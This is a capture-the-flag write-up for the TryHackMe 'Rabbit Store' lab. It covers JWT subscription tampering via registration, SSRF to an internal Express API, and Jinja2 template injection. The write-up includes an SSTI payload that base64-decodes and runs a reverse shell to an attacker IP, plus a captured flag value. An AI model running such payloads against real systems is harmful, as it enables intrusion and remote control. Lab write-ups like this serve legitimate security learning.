# Rabbit Store.thm

# Web Enumeration

After we login we see the cookie jwt:

![Screenshot from 2025-12-21 20-00-06.png](Rabbit%20Store%20thm/Screenshot_from_2025-12-21_20-00-06.png)

When decoding it : We see an inactive session.

![Screenshot from 2025-12-21 20-01-49.png](Rabbit%20Store%20thm/Screenshot_from_2025-12-21_20-01-49.png)

 

I tried to change it to active but in the browser says that the token is manipulated.

So i tried adding this `subscription: active`   when i register a user.

![Screenshot from 2025-12-21 20-07-11.png](Rabbit%20Store%20thm/Screenshot_from_2025-12-21_20-07-11.png)

We sucesfully make an active user.

![Screenshot from 2025-12-21 20-08-36.png](Rabbit%20Store%20thm/Screenshot_from_2025-12-21_20-08-36.png)

I looked how it handles the files when i send them. In the application says that it removes the file extension so I tried the null byte .php%00.php but in the server it actuall created an new name for the file so it doesn’t work. 

### I tried SSFR:

![Screenshot from 2025-12-21 20-14-25.png](Rabbit%20Store%20thm/Screenshot_from_2025-12-21_20-14-25.png)

It worked so i tried reading from the local host:

It didn’t actually work so i tried ports. We can see in the wallpzyler that it is running in expres js  which port 3000 is the most common port where it runs. and it worked.

We do a fuff run and find out that there is a file `api/docs` that we can’t read. so we try it on the SSRF and it works. 

![Screenshot from 2025-12-21 20-42-49.png](Rabbit%20Store%20thm/Screenshot_from_2025-12-21_20-42-49.png)

We go to the /api/fetch_messeges_from_chatbot :

![Screenshot from 2025-12-21 20-42-39.png](Rabbit%20Store%20thm/Screenshot_from_2025-12-21_20-42-39.png)

![Screenshot from 2025-12-21 23-49-41.png](Rabbit%20Store%20thm/Screenshot_from_2025-12-21_23-49-41.png)

![Screenshot from 2025-12-21 23-55-21.png](Rabbit%20Store%20thm/Screenshot_from_2025-12-21_23-55-21.png)

![Screenshot from 2025-12-21 23-55-48.png](Rabbit%20Store%20thm/Screenshot_from_2025-12-21_23-55-48.png)

We try to use a username that can trigger an error: something like `test(<{{;/*` :

![Screenshot from 2025-12-22 00-02-58.png](Rabbit%20Store%20thm/Screenshot_from_2025-12-22_00-02-58.png)

We see that the we get an jnija2 error so there is an python `jnija2 comman injection` that means that the `{{` is what trigers this error: SO we look if there is a `SSTI`

```jsx
{{ self.__**init__.__globals__.__builtins import**('os').popen('echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xNTIuMjAxLzk5OTkgMD4mMQ== |base64 -d |bash').read() }}

```

# And we get a revers shell:

![Screenshot from 2025-12-22 00-22-32.png](Rabbit%20Store%20thm/Screenshot_from_2025-12-22_00-22-32.png)

```jsx
cat user.txt : 98d3a30fa86523c580144d317be0c47e
```

### Tried:

- **User groups**
- **File permissions**
- **Cron jobs**
- **SUID binaries**
- **Running processes**

but didn’t find any immediate privilage escalation ways.

Trying `linpes.sh`